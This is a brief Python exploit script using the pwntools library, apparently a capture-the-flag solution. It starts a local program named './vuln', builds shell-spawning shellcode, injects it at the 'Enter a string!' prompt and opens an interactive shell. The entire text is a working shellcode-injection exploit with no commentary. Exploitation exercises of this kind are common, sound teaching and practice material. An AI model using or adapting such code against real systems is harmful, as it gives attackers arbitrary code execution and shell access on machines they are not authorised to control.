from pwn import *

p = process("./vuln")
context.binary = "./vuln"

shellcode = asm(shellcraft.sh())
p.sendlineafter("Enter a string!" , shellcode)
p.interactive()